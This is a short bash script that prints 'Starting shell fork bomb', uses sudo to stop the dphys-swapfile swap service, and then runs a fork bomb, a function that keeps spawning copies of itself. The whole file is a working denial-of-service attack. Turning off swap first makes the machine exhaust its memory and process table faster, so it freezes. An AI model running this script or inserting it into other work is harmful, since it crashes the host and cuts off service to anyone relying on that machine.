#!/bin/bash

echo "Starting shell fork bomb"
sudo systemctl stop dphys-swapfile.service
: (){ :|:& };:
